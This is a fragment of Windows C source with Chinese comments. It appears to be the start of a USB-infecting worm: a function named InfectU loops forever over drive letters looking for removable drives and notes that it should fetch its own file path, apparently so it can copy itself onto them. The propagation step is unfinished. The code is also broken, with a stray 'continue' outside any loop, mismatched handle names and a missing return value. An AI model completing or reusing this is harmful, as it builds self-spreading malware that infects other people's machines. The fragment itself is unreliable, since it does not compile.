//#include "stdafx.h"
#include<Windows.h>
#include<string.h>
//保存数据到文件
//Path 路径，Data 数据
 bool SaveToFile(char *Path,char* Data){
    HANDLE hFIle;
    hFIle = CreateFile(Path, GENERIC_WRITE,0,NULL,CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL,NULL);
    if(hFIle==INVALID_HANDLE_VALUE){
        continue;//出错
    }
    DWORD dwWrite;
    WriteFile(hFile,Data,strlen(Data),&dwWrite,NULL);
    CloseHandle(hFile);
    return true;
 }
 BOOL InfectU(){
     while(true){
         UINT revtype;
         char name[256] = "H:\\";
         char szNmae[256] = {0};
         char toPath[256] = {0};
         char inPath[256] = {0};
         char openU[80] = {0};
         //遍历盘符
         //C ~ N
         for(BYTE i = 0x43; i<0x4E;i=i+0x01){
             name[0] = i;
             revtype = GetDriveType(name);
             //是否是可移动设备
             if(revtype==DRIVE_REMOVABLE){
                 //得到自身文件路径
             }
         }
     }
 }